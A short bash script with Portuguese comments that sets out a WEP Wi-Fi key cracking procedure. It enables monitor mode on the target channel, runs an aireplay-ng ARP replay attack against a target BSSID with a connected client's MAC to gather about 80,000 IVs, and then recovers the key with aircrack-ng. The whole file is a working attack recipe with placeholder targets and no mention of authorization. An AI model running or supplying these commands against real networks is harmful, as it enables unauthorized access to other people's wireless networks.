#!/bin/bash

# 1) Iniciar placa em monitoramento com trava no canal alvo com airdump-ng
# 2) Gerar ao menos 80.000 em volume de dados gerando IVs na rede:

# Ataque: --arpreplay ou -3
# -b: BSSID alvo
# -h: Endereço MAC de um cliente conectado (adquirido no monitoramento)
# [interface]: Interface de rede monitorando pacotes.

aireplay-ng --arpreplay -b [BSSID] -h [MAC] [interface]

# 3) Dados coletados, parar monitoramento. Utilizar aircrack para extrair a chave:
# -a 1: WEP 2: WPA
aircrack-ng -a 1 [arquivo.cap]
